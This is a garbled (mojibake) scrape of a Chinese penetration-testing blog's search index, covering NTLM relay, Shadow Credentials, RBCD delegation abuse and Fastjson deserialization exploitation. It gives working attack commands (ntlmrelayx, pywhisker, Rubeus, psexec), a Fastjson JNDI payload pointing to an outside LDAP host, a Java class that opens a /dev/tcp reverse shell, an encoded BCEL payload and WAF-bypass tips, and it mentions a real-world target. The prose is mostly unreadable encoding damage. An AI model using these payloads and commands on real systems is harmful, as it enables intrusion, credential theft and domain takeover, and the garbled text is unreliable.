SSPçš„ã€‚æˆ‘ä»¬å¯ä»¥relayåˆ°Exchangeï¼Œä»è€Œæ”¶å‘é‚®ä»¶ï¼Œä»£ç†ç­‰ç­‰ã€‚åœ¨ä½¿ç”¨outlookçš„æƒ…å†µä¸‹è¿˜å¯ä»¥é€šè¿‡homepageæˆ–è€…ä¸‹å‘è§„åˆ™è¾¾åˆ°å‘½ä»¤æ‰§è¡Œçš„æ•ˆæœã€‚è€Œä¸”è¿™ç§Relayè¿˜æœ‰ä¸€ç§å¥½å¤„ï¼Œå°†Exchangeå¼€æ”¾åœ¨å¤–ç½‘çš„å…¬å¸å¹¶ä¸åœ¨å°‘æ•°ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨å¤–ç½‘å‘èµ·relayï¼Œè€Œä¸éœ€è¦åœ¨å†…ç½‘ï¼Œè¿™æ˜¯æœ€åˆºæ¿€çš„ã€‚(Net- NTLM åˆ©ç”¨ - windows protocol) https://github.com/Arno0x/NtlmRelayToEWS ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:6","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"å½±å­å‡­è¯ï¼ˆShadow Credentialsï¼‰ éšè”½æƒé™ç»´æŒã€‚ å¸¸è§„Kerberosé¢„è®¤è¯é˜¶æ®µï¼ˆpre-authï¼‰ï¼Œå®¢æˆ·ç«¯ç”¨è‡ªå·±çš„hashåŠ å¯†æ—¶é—´æˆ³ç»™KDCã€‚KDCä½¿ç”¨è¯¥ç”¨æˆ·çš„hashè§£å¯†ï¼ŒéªŒè¯é€šè¿‡åè¿”å›è¯¥ç”¨æˆ·çš„TGTã€‚è¿™æ˜¯å¯¹ç§°åŠ å¯†ï¼ˆDESã€RC4ã€AES128ã€AES256ï¼‰ã€‚Kerberosä¹Ÿæ”¯æŒéå¯¹ç§°çš„è®¤è¯æ–¹å¼ï¼Œé€šè¿‡è¯ä¹¦ï¼ˆPKINITï¼‰æˆ–å¯†é’¥å¯¹å®ç°ã€‚éœ€è¦å®‰è£…ADCSã€‚â€‹ Microsoft è¿˜å¼•å…¥äº†å¯†é’¥ä¿¡ä»»çš„æ¦‚å¿µï¼Œä»¥åœ¨ä¸æ”¯æŒè¯ä¹¦ä¿¡ä»»çš„ç¯å¢ƒä¸­æ”¯æŒæ— å¯†ç èº«ä»½éªŒè¯ã€‚åœ¨ Key Trust æ¨¡å‹ä¸‹ï¼ŒPKINIT èº«ä»½éªŒè¯æ˜¯åŸºäºåŸå§‹å¯†é’¥æ•°æ®è€Œä¸æ˜¯è¯ä¹¦å»ºç«‹çš„ã€‚ https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566abimage.png \" https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566abimage.png \" https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab ç®€å•æ¥è¯´å°±æ˜¯å®¢æˆ·ç«¯æœ‰è‡ªå·±çš„ä¸€å¯¹å¯†é’¥ï¼ŒKDCä¹Ÿå­˜ç€ç”¨æˆ·çš„å…¬é’¥ã€‚ä½¿ç”¨ç§é’¥åŠ å¯†é¢„è®¤è¯ä¿¡æ¯å‘ç»™KDCï¼ŒKDCä½¿ç”¨ç”¨æˆ·çš„å…¬é’¥è§£å¯†ï¼ŒéªŒè¯é€šè¿‡è¿”å›TGTã€‚ Windows server2016å¼•è¿›äº†ä¸€ä¸ªå±æ€§msDS-KeyCredentialLinkã€‚ è¯¥å±æ€§çš„å€¼æ˜¯ Key Credentialsï¼Œå®ƒæ˜¯åŒ…å«åˆ›å»ºæ—¥æœŸã€æ‰€æœ‰è€…å¯åˆ†è¾¨åç§°ç­‰ä¿¡æ¯çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œä¸€ä¸ªä»£è¡¨è®¾å¤‡ ID çš„ GUIDï¼Œå½“ç„¶è¿˜æœ‰å…¬é’¥ã€‚è¿™æ˜¯ä¸€ä¸ªå¤šå€¼å±æ€§ï¼Œå› ä¸ºä¸€ä¸ªå¸æˆ·æœ‰å¤šä¸ªé“¾æ¥è®¾å¤‡ã€‚ æˆ‘çš„ç†è§£ï¼šæˆ‘ä»¬ä¼ªé€ ä¸€ä¸ªå¯†é’¥å¯¹ï¼Œé€šè¿‡ä¿®æ”¹msDS-KeyCredentialLinkä¸ºæˆ‘ä»¬ä¼ªé€ çš„å…¬é’¥ï¼ŒAS_REQå‘é€ä¼ªé€ çš„å…¬é’¥å’Œä¼ªé€ ç§é’¥åŠ å¯†çš„æ—¶é—´æˆ³ï¼ŒKDCéªŒè¯AS_REQä¸­çš„å…¬é’¥å’ŒmsDS-KeyCredentialLinkçš„å…¬é’¥ï¼Œç„¶åå†ç”¨å…¬é’¥è§£å¯†ã€‚éªŒè¯é€šè¿‡åè¿”å›TGTã€‚ åˆ©ç”¨ï¼š é¦–å…ˆéœ€è¦ç»™ä¸€ä¸ªæœºå™¨æ–°å¢msDS-KeyCredentialLinkã€‚æœºå™¨è´¦æˆ·å¯ä»¥ç»™è‡ªå·±æ–°å¢ã€‚é«˜æƒé™è´¦æˆ·å¯ä»¥ç»™å…¶ä»–è´¦æˆ·æ–°å¢ã€‚ python3 pywhisker.py -d \"adc.com\" -u \"administrator\" -p \"sss@123\" --target \"yangguo\" --action \"list\" --dc-ip 10.10.10.10 ç¬¬ä¸€æ¬¡å¤§æ¦‚ç‡ä¼šé‡åˆ°ä¸‹é¢çš„é”™è¯¯ã€‚éœ€è¦å»åŸŸæ§ä¸Šæ³¨å†Œè¯ä¹¦ã€‚ FAS - Request not supported while launching a published Desktop with FAS è·å–hashï¼šåŸç†çœ‹ä¸‹é¢è¿™æ®µè¯ https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566abimage.png \" https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab ç»“åˆNTLM Relay https://github.com/SecureAuthCorp/impacket/pull/1249 ç”¨æˆ·å¯¹è±¡ä¸èƒ½ç¼–è¾‘è‡ªå·±çš„ msDS-KeyCredentialLink å±æ€§ï¼Œè€Œæœºå™¨è´¦æˆ·å¯ä»¥ã€‚è¿™æ„å‘³ç€ä»¥ä¸‹åœºæ™¯å¯ä»¥å·¥ä½œï¼šä» DC01 è§¦å‘ NTLM èº«ä»½éªŒè¯ï¼Œå°†å…¶ä¸­ç»§åˆ° DC02ï¼Œä½¿ pywhisker ç¼–è¾‘ DC01 çš„å±æ€§ä»¥åœ¨å…¶ä¸Šåˆ›å»º Kerberos PKINIT é¢„èº«ä»½éªŒè¯åé—¨ï¼Œå¹¶é€šè¿‡ PKINIT å’Œ pass-the-cache æŒä¹…è®¿é—® DC01ã€‚ è®¡ç®—æœºå¯¹è±¡å¯ä»¥ç¼–è¾‘å®ƒä»¬è‡ªå·±çš„ msDS-KeyCredentialLink å±æ€§ï¼Œä½†åªèƒ½åœ¨æ²¡æœ‰ KeyCredential å­˜åœ¨çš„æƒ…å†µä¸‹æ·»åŠ ã€‚ è§£å†³impacketæŠ¥é”™ python3 -m pip install . python3 ntlmrelayx.py --shadow-credentials --shadow-target 'mssql$' -t ldap://10.10.10.10 --remove-mic ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:7","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"RBCD åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾åˆåRBCDã€‚ é…ç½®çº¦æŸæ€§å§”æ´¾å’Œéçº¦æŸæ€§å§”æ´¾éƒ½éœ€è¦SeEnableDelegationæƒé™ã€‚è€Œè¿™ä¸ªæƒé™ä¸€èˆ¬åªæœ‰åŸŸç®¡æ‰æœ‰ã€‚ä¸ºäº†èµ‹äºˆç”¨æˆ·æ›´å¤§çš„çµæ´»æ€§ï¼Œå¾®è½¯åœ¨Windows server 2012ä¸­å¼•è¿›åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ã€‚ åŸºäºèµ„æºçš„çº¦æŸå§”æ´¾åªèƒ½åœ¨è¿è¡ŒWindows Server 2012 R2å’ŒWindows Server 2012çš„åŸŸæ§åˆ¶å™¨ä¸Šé…ç½®ï¼Œä½†å¯ä»¥åœ¨æ··åˆæ¨¡å¼æ—ä¸­åº”ç”¨ã€‚ é…ç½®åŸºäºèµ„æºçš„çº¦æŸæ€§å§”æ´¾ï¼Œæ— éœ€SeEnableDelegationæƒé™ï¼Œåªéœ€è¦å¯¹æœºå™¨å…·æœ‰å†™å±æ€§æƒé™ï¼ˆWritePropertyï¼‰ã€‚å³å¯é…ç½®ã€‚ msDS-AllowedToDelegateTo å˜æˆäº† msDS-AllowedToActOnBehalfOfOtherIdentityã€‚ä½†æ˜¯æ–¹å‘ç›¸åã€‚å‚ç…§ä¸‹å›¾ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼ŒserviceBä¸Šé…ç½®msDS-AllowedToActOnBehalfOfOtherIdentityçš„å€¼ä¸ºserviceAã€‚é‚£ä¹ˆserviceBå°±ä¿¡ä»»æ¥è‡ªserviceAçš„å§”æ´¾ã€‚ä¹Ÿå°±æ˜¯ä¸‹å›¾çš„ä¼ å‡ºä¿¡ä»»ä¸ä¼ å…¥ä¿¡ä»»ã€‚ https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.htmlimage.png \" https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html Relay è‡ªåŠ¨åˆ›å»ºä¸€ä¸ªæœºå™¨è´¦æˆ·ï¼Œå¯†ç éšæœºã€‚éœ€è¦ldapsã€‚ python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --remove-mic --delegate-access -smb2support æŒ‡å®šæœºå™¨è´¦æˆ· python3 ntlmrelayx.py -t ldap://10.10.10.10 -debug --remove-mic --delegate-access --escalate-user testpc\\$ python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' export KRB5CCNAME=administrator.ccache python3 psexec.py -no-pass -k 'adc.com/administrator@web2.adc.com' è®¡ç®—hash .\\Rubeus.exe hash /domain:adc.com /user:USCJNQTK$ /password:\"iJ'vp3V\u003e'4De}tf\" è¯·æ±‚st .\\Rubeus.exe s4u /user:USCJNQTK$ /aes256:64033274241a7f086ce4254fc8a46072810c021013a546c807bad5421d33f7b6 /impersonateuser:Administrator /msdsspn:host/web2.adc.com /altservice:cifs /domain:adc.com /nowrap /ptt åŠ åŸŸè´¦æˆ· å½“ä¸€ä¸ªç”¨æˆ·ç»™ä¸€å°æœºå™¨åŠ åŸŸåï¼Œè¯¥ç”¨æˆ·å°±å¯¹è¯¥æœºå™¨å…·æœ‰å†™å±æ€§æƒé™ï¼ˆWritePropertyï¼‰ã€‚è€Œä¼ä¸šä¸­å¾€å¾€éƒ½ä¼šæœ‰ä¸€ä¸ªä¸“é—¨çš„åŠ åŸŸç”¨æˆ·ï¼Œå½“æˆ‘ä»¬æ‹¿åˆ°äº†è¿™ä¸ªåŠ åŸŸç”¨æˆ·çš„å‡­æ®åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡RBCDæ§åˆ¶ç”±è¯¥ç”¨æˆ·åŠ å…¥åŸŸå†…æ‰€æœ‰æœºå™¨çš„æƒé™ã€‚ é¦–å…ˆå‡è®¾æˆ‘ä»¬æŠ“åˆ°äº†åŠ åŸŸè´¦æˆ·ï¼ˆjoinï¼‰çš„å“ˆå¸Œæˆ–å¯†ç ã€‚ python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -delegate-from USCJNQTK -action write 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 rbcd.py -delegate-to 'web2' -action read 'adc.com/join:song@2020' -dc-ip 10.10.10.10 python3 getST.py -impersonate 'administrator' -spn 'cifs/WEB2.adc.com' -dc-ip 10.10.10.10 'adc.com/USCJNQTK\\$:' ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:3:8","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["ADåŸŸ"],"content":"å‚è€ƒ Relay - The Hacker Recipes NTLM ç¯‡ - windows protocol [åŸŸæ¸—é€] SQLSERVER ç»“åˆä¸­ç»§ä¸å§”æ´¾ å®‰å…¨ç ”ç©¶ | ä½¿ç”¨PetitPotamä»£æ›¿Printerbug ã€M01Nã€‘èµ„æºçº¦æŸå§”æ´¾å’ŒNTLM Relayingçš„ç»„åˆæ‹³æ¥ç®¡åŸŸå†…ä»»æ„ä¸»æœºç³»ç»Ÿæƒé™ â€“ ç»¿ç›Ÿç§‘æŠ€æŠ€æœ¯åšå®¢ Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members Lateral Movement â€“ WebClient â€“ Penetration Testing Lab ","date":"2022-02-18","objectID":"https://songzhiv.github.io/ntlm-relay/:4:0","tags":null,"title":"NTLM Relay","uri":"https://songzhiv.github.io/ntlm-relay/"},{"categories":["web"],"content":"0X01 æ¼æ´åˆ©ç”¨ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:0:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"æ¢æµ‹fastjson å¯¹äºæœ‰é”™è¯¯å›æ˜¾çš„æƒ…å†µ ä½¿ç”¨{\"@type\": \"java.lang.AutoCloseable\"æˆ–è€… \"{\"a\":x\"é€šè¿‡å¼‚å¸¸ç›´æ¥å›æ˜¾å‡ºç‰ˆæœ¬å·ï¼Œæ¥ä¸‹æ¥å°±ç›´æ¥æ ¹æ®ç‰ˆæœ¬å·åˆ¤æ–­æœ‰æ²¡æœ‰æ¼æ´å’Œæ‰¾expäº† æ— å›æ˜¾ä½¿ç”¨dnslogæ¢æµ‹POCï¼š {\"@type\":â€œcom.alibaba.fastjson.JSONObjectâ€, {\"@type\": â€œjava.net.URLâ€, â€œvalâ€:â€œhttp://sq20yi.ceye.ioâ€}}\"\"} {\"@type\":â€œjava.net.Inet6Addressâ€,â€œvalâ€:â€œsq20yi.ceye.ioâ€} æŠ“åŒ…ä¿®æ”¹è¯·æ±‚ä½“ ==dnslog==æ”¶åˆ°è¯·æ±‚ä¿¡æ¯å°±ä»£è¡¨ä½¿ç”¨äº†==fastjson==æ¥è§£æçš„jsonæ•°æ® ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:1:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"éªŒè¯æ˜¯å¦å­˜åœ¨æ¼æ´ fastjson1.2.47ä»¥åçš„ç‰ˆæœ¬åˆ©ç”¨ æ¡ä»¶éƒ½æ¯”è¾ƒè‹›åˆ»ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬éƒ½ä¼šé‡‡ç”¨ç»å…¸çš„1.2.47çš„POCï¼Œ æ— é™åˆ¶RCEï¼Œé€šæ€â‰¤1.2.47çš„æ‰€æœ‰ç‰ˆæœ¬ã€‚47ç‰ˆæœ¬pocå¦‚ä¸‹ {\"name\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"x\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://47.119.161.84:1389/Exploit\",\"autoCommit\":true}}} åœ¨æˆ‘ä»¬çš„äº‘æœåŠ¡å™¨ä¸Šå¼€å¯LDAPæœåŠ¡ï¼šjava -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://47.119.161.84/#Exploit åŒç›®å½•å¼€å¯httpæœåŠ¡ï¼špython3 -m http.server 80 NCç›‘å¬ï¼šnc -lvvp 8888 javacç¼–è¯‘ä¸‹é¢æ¶æ„ç±»ï¼Œå°†ç¼–è¯‘å¥½çš„Exploit.classæ–‡ä»¶æ”¾åœ¨httpåŒç›®å½•ä¸‹ public class Exploit { public Exploit(){ try{ Runtime.getRuntime().exec(\"/bin/bash -c $@|bash 0 echo bash -i \u003e\u0026/dev/tcp/xxx.xxx.xxx.xxx/8888 0\u003e\u00261\"); }catch(Exception e){ e.printStackTrace(); } } public static void main(String[] argv){ Exploit e = new Exploit(); } } å‘é€payloadï¼Œgetshell å®æˆ˜åŸºæœ¬æ˜¯ç›´æ¥æ‹¿47ç‰ˆæœ¬çš„payloadæ‰“dnslogï¼Œdnslogæœ‰ååº”å°±ç»§ç»­ï¼Œæ²¡ååº”å†ä¸€æ­¥ä¸€æ­¥éªŒè¯ã€‚ ğŸ™ƒæ•ˆç‡é«˜å¾ˆå¤šã€‚ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:2:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ç»•è¿‡é«˜ç‰ˆæœ¬jdkå¯¹jndiæ³¨å…¥çš„é™åˆ¶ é«˜ç‰ˆæœ¬jdké»˜è®¤ç¦æ­¢jndiæ³¨å…¥ã€‚ æ‰€ä»¥åŸºäºjndi+RMIçš„åˆ©ç”¨éœ€è¦JDKç‰ˆæœ¬\u003c=6u141ã€7u131ã€8u121ï¼Œ åŸºäºjndi+LDAPåˆ©ç”¨çš„JDKç‰ˆæœ¬\u003c=6u211ã€7u201ã€8u191ã€11.0.1 ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:3:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"å¦‚ä½•åˆ¤æ–­æœåŠ¡æ˜¯å¦ä½¿ç”¨é«˜ç‰ˆæœ¬jdk ä½ç‰ˆæœ¬jdkçš„jndiæ³¨å…¥ï¼ˆjdk1.8.45ï¼‰ï¼š ldapæ”¶åˆ°è¯·æ±‚é‡å®šå‘åˆ°http://47.119.161.84:888/Exploit.classã€‚ å†å‘èµ·httpè¯·æ±‚åŠ è½½Exploit.class(å¼¹è®¡ç®—å™¨) é«˜ç‰ˆæœ¬jdkçš„jndiæ³¨å…¥ï¼ˆjdk1.8.212ï¼‰ï¼š ldapæœåŠ¡æ”¶åˆ°äº†è¯·æ±‚ï¼Œå¯æˆ‘ä»¬èµ·çš„httpæœåŠ¡å´æ²¡æœ‰ååº”ï¼Œä¹Ÿå°±è®¿é—®ä¸åˆ°æˆ‘ä»¬çš„æ¶æ„ç±»äº†ã€‚ æ‰€ä»¥å®æˆ˜æƒ…å†µä¸‹é‡åˆ°ä¸Šè¿°æƒ…å†µï¼ˆldapæœåŠ¡æ”¶åˆ°ä¿¡æ¯ï¼Œå´æ²¡æœ‰httpè¯·æ±‚ï¼‰å¤šåŠå¯ä»¥æ–­å®šæ˜¯é‡‡ç”¨é«˜ç‰ˆæœ¬jdkã€‚ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:3:1","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ç»•è¿‡é«˜ç‰ˆæœ¬jdkå¯¹jndiæ³¨å…¥çš„é™åˆ¶ ç»•è¿‡åŸç†å‚è€ƒï¼šhttps://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html https://www.mi1k7ea.com/2020/09/07/æµ…æé«˜ä½ç‰ˆJDKä¸‹çš„JNDIæ³¨å…¥åŠç»•è¿‡ ä¾èµ–å—å®³è€…æœ¬åœ°CLASSPATHä¸­ç¯å¢ƒï¼Œåˆ©ç”¨å—å®³è€…æœ¬åœ°çš„Gadgetè¿›è¡Œæ”»å‡»ã€‚ javax.el.ELProcessorä¾èµ–äºtomcat8 com.ibm.ws.webservices.engine.client.ServiceFactoryä¾èµ–äºIBM WebSphere com.ibm.ws.client.applicationclient.ClientJ2CCFFactoryä¾èµ–äºIBM WebSphere GitHubä¸Šçš„è½®å­ï¼šhttps://github.com/veracode-research/rogue-jndi ä»¥å®æˆ˜ä¸ºä¾‹ï¼šæ·±åœ³åœ°è´¨å±€çš„fastjson ï¼šè§è§†é¢‘ ğŸ˜‡ ","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:3:2","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"fastjsonä¸å‡ºç½‘ä¸å‘½ä»¤å›æ˜¾ æ³¨ï¼šæ­¤æ”»å‡»æ‰‹æ³•åŒæ ·é€‚ç”¨äºé«˜ç‰ˆæœ¬jdkä¸‹çš„åˆ©ç”¨ 1.2.24ç‰ˆæœ¬çš„ä¸‰ä¸ªPOCï¼š 1. åŸºäºcom.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl { \"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\":[\"poc_base64\"], '_name':'a.b', '_tfactory':{ }, \"_outputProperties\":{}, \"_name\":\"a\", \"_version\":\"1.0\", \"allowedProtocols\":\"all\" } 2.åŸºäºcom.sun.rowset.JdbcRowSetImplï¼ˆJNDIï¼Œç”¨çš„æœ€å¤šï¼‰ { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true } 3.åŸºäºorg.apache.tomcat.dbcp.dbcp.BasicDataSource { \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassLoader\": { \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\": \"$$BCEL$$$l$8b......\" } å…¶ä¸­åŸºäºå…¶ä¸­1ã€3åˆ©ç”¨é“¾éƒ½æ˜¯åŸºäºjavaå­—èŠ‚ç ï¼Œä¸éœ€è¦å‡ºç½‘ã€‚ä½¿ç”¨47ç‰ˆæœ¬çš„ç»•è¿‡æ–¹å¼ï¼ˆjava.lang.Classï¼‰æ”¹é€ 1ã€3ä¸¤ä¸ªpocï¼Œä½¿ä»–ä»¬é€‚ç”¨äº47ä»¥ä¸‹çš„ç‰ˆæœ¬ã€‚ { \"a\": { \"@type\": \"java.lang.Class\", \"val\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\" }, \"b\": { \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"poc_base64\"], '_name': 'a.b', '_tfactory': {}, \"_outputProperties\": {}, \"_name\": \"b\", \"_version\": \"1.0\", \"allowedProtocols\": \"all\" } } { { \"@type\": \"com.alibaba.fastjson.JSONObject\", \"x\":{ \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\", \"driverClassLoader\": { \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\" }, \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$95W$Jx$Ug$Z$7e$t$bb$9b$99L$s$90$y$y$n$Jm9K$Sr$ARZ$S$K$84$40$m$92$84$98$NP$O$95$c9dH$W6$3bav$96$40$ab$b6JZ$5b$LZ$Lj9$d4$Kj$3c$f0$m$d1$r$82E$bc$82$d6$fb$3e$aax$l$f5$be$8b$8fJ$7d$ff$99$Nn$c8$96$3c$3e$cf$ce$7f$7e$ffw$be$df$f7$ff$fb$f4$b5$f3$X$B$y$c1U$V$c5x$m$H$ab$f1j$d1$bcF$c6A$V$7eo$a5_4$P$wxH$c5k$f1$b0$98$3c$a2$e0u$a2$7fT$c6$n$Vy8$ac$e2$f5x$83$ca$95$c7$c4$a97$8a$e6q1$3d$o$d8$kUQ$887$vx$b3$8c$b7$c8xB$cc$8e$c98$ae$a0I$c5$J$9c$U$8c$de$aa$a0C$c6$dbd$bc$5d$c5L$i$96$f1$a4$8a$d9$a2$7f$87$8a$b98$ac$e0$94$8a$d3x$a7$8a$e9x$97$82w$8b$7e$40$c1$7b$U$bcW$c1$fbd$bc_$c6$Z$V$l$c0$HE$f3$n$V$l$c6Y$V$d5$YT0$q$fa$8f$88$e6$a3$w$aa$90$U$cd9$d1$M$L5$3e$a6$e2$3c$$$88$e6$e3b$fa$94P$f9$a2$8cO$88$c9$ra$d3$te$7cJ$82$d4$zaJ$d3n$7d$9f$5e$9dp$o$d1$ea$f5z$bc$3bl$3a$b5$Sr$c2$91$ae$98$ee$qlS$c2$fc$f1$U$cb$bd$a5$a8$k$eb$aa$de$d8$b1$db4$9c$da$V$3c$95eD$r$U$a6$ed$d5G$f5x$bc$c9$d2$3bM$9b$db$be$ee$b8$z$a1$e0$c6$7do$a7$97$ad$d1$d3$v$n$98$b6$lv$ecH$ac$8b$E$92$3dv$p$r$94$h$3c$97$bd$3c$S$8b8$x$c8$a0$b4l$b3$E$7f$bd$d5I$b5$t7EbfK$a2$a7$c3$b4$db$f5$8e$a8$v$YX$86$k$dd$ac$db$R1O$zJ$fcf$df$a8R$8b$e54X$89X$e7$da$fd$86$d9$ebD$ac$Y$r$f9$9d$eeH$5c$c2$9c$a6x$a2$a7$c7$b4$e3$a6Qm$g$ddVu$bd$Vsl$x$g5$ed$ea$baht$z$97H$9c$XvtcO$b3$de$ebJ$a1$b3$J$u$ca$8aH$I$95$8e7$a3l$hu$b7$3avK$c8o6$9dn$ab$b3U$b7$f5$k$d3$a1$U$J$d32$ih$Uv$e6v$99N$9b$Z$ef$b5bq$daP$9cFe$9b$bb$a2$q$ab$f6$98Q$9dP$daf$baM$e9$867$d2$84$$$3dZg$Yf$3c$9eNT$99$81scl$l$7d$v$I$dau$9bz$a4$d3$cfJ$a3o$b1$c2$J$a3$db$d3$p$9d$s$d7$e8$d6$e9B$a7$85f$S7$bd$7d$d7u$8cX$d5$ad$M$ba$b3$c5$8e8$$j$qKB$a0$93$t$JV$a9$d1K$s$e6$RS$889$c7$a5$G$7e$7b$e9$f1N$d3$88$ea$b6$d9$d9$Q1$a3$84QQ$G$ad$dd$z$b2$M$c4$j$ddvx$$$e6f$ee$a7e$7c$86y$xAYnDSPR$c3V$c26$cc$86$88$c0$88$96$Kl$95$60$a9$e1$rh$d3$d0$82$8d$gZ$b1$91$80$k$97$k$g$ea$b1F$c3$3a$ac$970O$ec$ee$af$8a$9b$f6$be$a8$e9Tu$3bNo$d5z6ao$a1$cd$dc$9b0$e3$8e$8c$cfj$Y$c1e$N$8dx$b1$84$db$t$3a$e4E$5d$c3$GA$3ds$o$f4j$f8$i$dad$7c$5e$c3$d3$f8$82$868h$c4$X$f12$N_$S$cdKE$f3e$7cE$c3W$f15$a6$3e$c3$b9$de$U$v$cb$i$ba$813$Bzcrj$f8$3a$be1f$dd$c3$a8$8coj$f8$W$be$ad$a1$J$cd$y3$Z$A8F$f3$cc$f0$93$b0$e0$ff$A$9f$84$db$s$80$9e$E$d9$8aW$c5$88$3a$Z$df$d1$f0$5d$7cO$c3$f7$f1$MkH_$q$d6i$f5$J$bf$fc$80$c9$b8n$f5$G$c2dS$7bC$e5$5d$9eG$3c8$8e$da1$W$a4c$m$Q6$f4X$cc$b4e$fcP$c3$V$fcH$c3$8f$f1$T$Z$3f$d5$f03$fc$5c$40$e7$X$84$fb$8e$3a$N$bf$c4$af4$fc$g$cfhx$W$bf$d1$f0$5b$81$a9$df$89$e6$f7$f8$D$f1$a8$e1$8f$f8$93$86$3f$e3$_$g$fe$8a$bf$J$a8$e9$94$be$7d$7c$z$d0$f0w$R$bb$7f$e09$a6$de$84$b5$89$85b$fbM2$a3$f0$F$b6$98$9e$Z$ab$3a$9d$T$e5$m$F$8ey$a5$e3kwY$86r$3f$b9W8$cf$z$91$ed$b6n$98c$e0$d3$dem$T$7dLh$pa$dbf$cc$Z$9dO$zMg$e5$ad$92$97b$d0F$3d$S$a3x$9f$deI$3a$85$d1J$e93$a54$93$f4$fcH$bc$$$k$X$f7$hK","date":"2022-02-01","objectID":"https://songzhiv.github.io/fastjson/:4:0","tags":null,"title":"Fastjsonåˆ©ç”¨æ€»ç»“","uri":"https://songzhiv.github.io/fastjson/"},{"categories":["web"],"content":"ç»•waf ä¸åŒä¸ä¼ ç»Ÿjsonæ ‡å‡†ï¼Œåœ¨fastjsonä¸­16è¿›åˆ¶æ˜¯å¯ä»¥è¢«è§£æçš„ã€‚å®ƒè¿˜æ”¯æŒåœ¨jsonè¯­å¥ä¸­åŠ å…¥æ³¨é‡Šï¼Œå•å¼•å·æ›¿æ¢åŒå¼•å·ï¼Œé»˜è®¤ä¼šå»é™¤é”®ã€å€¼å¤–çš„ç©ºæ ¼ã€\\bã€\\nã€\\rã€\\fç­‰ç­‰ç­‰ã€‚ å¦‚ä»Šå¸‚é¢ä¸Šå¤§éƒ¨åˆ†wafåªé’ˆå¯¹@type å’Œcom.sun.rowset.JdbcRowSetImpl è¿›è¡Œæ£€æµ‹ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡ç»“åˆUnicodeå’Œ16è¿›åˆ¶ç¼–ç å³å¯è½»æ¾ç»•è¿‡wafã€‚ ä»¥OPPOäº‘å’Œé˜¿é‡Œäº‘wafä¸ºä¾‹ 